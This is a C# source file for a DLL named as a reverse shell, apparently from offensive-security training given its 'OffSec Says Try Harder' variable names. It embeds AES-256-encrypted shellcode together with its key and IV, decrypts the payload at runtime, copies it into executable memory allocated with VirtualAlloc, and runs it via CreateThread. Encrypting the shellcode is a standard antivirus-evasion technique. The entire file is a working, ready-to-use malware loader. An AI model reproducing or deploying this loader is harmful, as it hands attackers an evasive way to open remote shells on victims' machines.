using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace DLL_ReverseShell
{
    public class ReverseShell
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;

                // Keep this in mind when you view your decrypted content as the size will likely be different.
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        public static void runner()
        {
            // Key bytes
            byte[] OffSec = new byte[32] {
            0x3d, 0xb8, 0x60, 0x68, 0x21, 0x96, 0x25, 0x5d, 0x05, 0x2e, 0x1a, 0x20, 0x50, 0xb6, 0xcf,
            0x23, 0x72, 0xfc, 0x53, 0x9f, 0xc5, 0x2d, 0xa4, 0xb3, 0x49, 0x75, 0xa3, 0x68, 0x07, 0x9b,
            0x3a, 0x7f };

            // IV bytes
            byte[] Says = new byte[16] {
            0x8b, 0xa4, 0x4d, 0x6b, 0x73, 0x0d, 0xa4, 0x3e, 0x14, 0x7c, 0xb6, 0xea, 0xda, 0x5a, 0x88,
            0xf2 };

            // AES 256-bit encrypted shellcode
            byte[] Try = new byte[672] {
            0x61, 0x40, 0x08, 0x59, 0x00, 0x1c, 0x99, 0xc4, 0xe5, 0x4b, 0x31, 0x27, 0x35, 0x62, 0x41,
            0x85, 0x7d, 0x08, 0xfc, 0xcb, 0x3c, 0x67, 0x26, 0xad, 0x3c, 0x57, 0xc5, 0x9c, 0x07, 0x85,
            0xe7, 0x47, 0x57, 0x03, 0xcb, 0x99, 0x26, 0x6c, 0xfa, 0xdc, 0x21, 0xd6, 0x88, 0x98, 0xb5,
            0x20, 0x52, 0xe6, 0x52, 0x3a, 0x73, 0xe6, 0x61, 0x8d, 0x6c, 0xb5, 0xf0, 0x3b, 0xee, 0x2a,
            0x83, 0x90, 0xfe, 0x68, 0x2a, 0xb0, 0xc0, 0x43, 0x20, 0x76, 0x7e, 0x18, 0x20, 0xf0, 0x24,
            0x7f, 0x5f, 0x4e, 0x40, 0xc3, 0x79, 0xfc, 0xa5, 0x30, 0x98, 0xc8, 0x8c, 0x22, 0xa9, 0x9f,
            0x80, 0x35, 0x97, 0xa3, 0x80, 0x9b, 0xc7, 0x29, 0x37, 0x91, 0x38, 0xe7, 0xe1, 0x0c, 0x06,
            0x3d, 0xa6, 0xaa, 0x53, 0x93, 0x0d, 0xe0, 0x6f, 0xcb, 0x54, 0x81, 0x83, 0xa9, 0x1c, 0x7a,
            0x7f, 0x5b, 0xed, 0x30, 0xcb, 0xe0, 0x95, 0xfa, 0xfe, 0x9e, 0x5b, 0xbd, 0x48, 0x9e, 0xa8,
            0xa1, 0x3e, 0x22, 0xe6, 0x5c, 0xcc, 0x1c, 0x58, 0x3a, 0xca, 0x09, 0x2e, 0xcf, 0x44, 0x0d,
            0xc6, 0xf5, 0xbf, 0xb4, 0x2d, 0x5b, 0xe6, 0x1c, 0x37, 0x89, 0x62, 0x18, 0x13, 0x37, 0x3e,
            0x56, 0x5a, 0xc3, 0x29, 0x74, 0xda, 0xb4, 0x56, 0xa4, 0x12, 0x9a, 0x8e, 0x5d, 0x4b, 0xfc,
            0x87, 0x51, 0x97, 0xa0, 0x8b, 0x5a, 0x60, 0x48, 0x50, 0x97, 0xed, 0x2c, 0x3c, 0xe5, 0xa4,
            0x65, 0x6f, 0x62, 0x17, 0xb9, 0x63, 0x08, 0xf5, 0x90, 0xb9, 0x4a, 0x5e, 0x69, 0x13, 0xc6,
            0xec, 0x0f, 0xf0, 0x59, 0xb2, 0x7a, 0x58, 0xe8, 0x51, 0xdf, 0x7a, 0x95, 0x5b, 0x98, 0xa5,
            0x05, 0x36, 0x38, 0xbf, 0x51, 0x8b, 0x62, 0x26, 0x6e, 0x60, 0x7d, 0x84, 0x83, 0x67, 0xf4,
            0x18, 0x87, 0xfb, 0x8a, 0x66, 0xa6, 0xbc, 0xd9, 0x35, 0x24, 0xfe, 0x51, 0x3f, 0xc5, 0xd5,
            0x2e, 0x2c, 0x1e, 0x23, 0xa3, 0x75, 0x18, 0x61, 0xc7, 0x24, 0xcd, 0x97, 0x01, 0xd0, 0xd6,
            0xd5, 0x3b, 0x15, 0x73, 0xbf, 0xb9, 0x41, 0x26, 0xaf, 0xe6, 0x2d, 0x71, 0x0d, 0xc3, 0xac,
            0x1b, 0x13, 0x37, 0xa4, 0xa6, 0xef, 0x66, 0x6b, 0x10, 0x3c, 0x76, 0x31, 0xd0, 0x9b, 0xe2,
            0xd0, 0x2f, 0x3d, 0x21, 0xdf, 0x4c, 0x72, 0xce, 0x04, 0xc3, 0xe8, 0xb1, 0x62, 0xd0, 0x59,
            0x8b, 0xa9, 0xd4, 0x6a, 0x66, 0x32, 0x68, 0xb0, 0xf0, 0x8f, 0x6f, 0xbd, 0xff, 0x35, 0xc0,
            0x6a, 0x66, 0xeb, 0xf5, 0xd8, 0xaa, 0x1d, 0x27, 0x9b, 0x4b, 0xe7, 0x16, 0x3c, 0x11, 0xb8,
            0x85, 0x7a, 0xd3, 0xa0, 0x52, 0x70, 0x1a, 0x43, 0xa4, 0xa5, 0x21, 0x69, 0xde, 0x58, 0x35,
            0x79, 0x96, 0xba, 0x8a, 0x00, 0xe5, 0x26, 0xd2, 0x05, 0xd5, 0xc8, 0x9d, 0x3c, 0x0e, 0xd3,
            0x8d, 0xdf, 0xc1, 0x28, 0xff, 0x6c, 0xc6, 0x37, 0x20, 0x13, 0xbe, 0xc1, 0x3e, 0x71, 0x5a,
            0xf0, 0x63, 0xb4, 0x0c, 0xdc, 0x2b, 0xd4, 0xce, 0x68, 0xbd, 0xc8, 0x8a, 0x1b, 0xaa, 0xb3,
            0x75, 0xf5, 0x6d, 0xf4, 0xca, 0x9c, 0xff, 0x02, 0x9d, 0xca, 0x71, 0xb2, 0xa5, 0x31, 0x8f,
            0xc3, 0xc9, 0xe5, 0x0f, 0x03, 0x95, 0x97, 0x70, 0x00, 0x31, 0x7a, 0x27, 0x6d, 0xe5, 0xb9,
            0xbf, 0x99, 0xf9, 0xea, 0xf2, 0xc6, 0xe5, 0x46, 0xff, 0x8a, 0xe8, 0x46, 0xb7, 0x27, 0x6a,
            0x92, 0x8b, 0xc4, 0xd0, 0x0f, 0x7e, 0x26, 0xc9, 0x94, 0x35, 0xe4, 0x70, 0xc0, 0x35, 0xe3,
            0x34, 0x54, 0xb1, 0xdc, 0xf9, 0xd1, 0xd2, 0x07, 0x40, 0xa2, 0xcc, 0x9a, 0x78, 0x1c, 0xde,
            0x5b, 0x1e, 0xab, 0xdf, 0x83, 0x60, 0xed, 0x64, 0x04, 0xd3, 0xb0, 0xc6, 0xce, 0x8b, 0xef,
            0xef, 0x6b, 0x2b, 0x61, 0x7f, 0x20, 0x46, 0xd0, 0x3f, 0x30, 0xac, 0xe8, 0x33, 0x17, 0xb4,
            0x7b, 0xf6, 0xc8, 0xd4, 0xfc, 0xf2, 0x78, 0x6a, 0xd0, 0xb8, 0x89, 0x11, 0xaf, 0x51, 0x1f,
            0xbf, 0x52, 0xf4, 0x66, 0x40, 0x4f, 0x51, 0x12, 0x28, 0xb4, 0xcc, 0x80, 0xeb, 0x41, 0x90,
            0x68, 0x36, 0xb4, 0x7f, 0x94, 0x36, 0xac, 0x21, 0xcd, 0x8d, 0x6a, 0x3f, 0x6d, 0x18, 0x4b,
            0xe9, 0xea, 0xe0, 0x70, 0xca, 0x4b, 0xe2, 0x6a, 0xe2, 0x29, 0x62, 0xa8, 0x5d, 0x65, 0xd0,
            0x19, 0xf7, 0x5e, 0x26, 0x97, 0x7c, 0x69, 0x4c, 0x8f, 0x3f, 0x10, 0xa1, 0x2e, 0x39, 0x4c,
            0x8b, 0x1c, 0xc0, 0x68, 0x00, 0x64, 0xc0, 0x24, 0x56, 0xc4, 0x99, 0x83, 0xd0, 0x16, 0x34,
            0xfb, 0xc1, 0x4d, 0x8e, 0x94, 0x7a, 0x51, 0x14, 0x4f, 0xc1, 0x39, 0x5d, 0x44, 0x4b, 0xbf,
            0x29, 0xd8, 0x2a, 0xd9, 0xfc, 0x26, 0xc8, 0xad, 0xda, 0xff, 0x84, 0x8f, 0x42, 0x1a, 0x55,
            0x07, 0x12, 0x18, 0x0f, 0x98, 0x75, 0xf6, 0x1e, 0x67, 0xc4, 0x03, 0xf4, 0x3d, 0xf9, 0x59,
            0x88, 0xa9, 0x66, 0xf9, 0x90, 0xb7, 0x5f, 0xc7, 0x50, 0x39, 0x91, 0x89, 0xd6, 0x92, 0x9f,
            0xa7, 0x95, 0xf0, 0x3e, 0x04, 0xd2, 0x89, 0xff, 0x61, 0xf1, 0x07, 0x11 };

            // Decrypt our shellcode
            var crypto = new ReverseShell();
            byte[] Harder = crypto.Decrypt(Try, OffSec, Says);
            int size = Harder.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(Harder, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}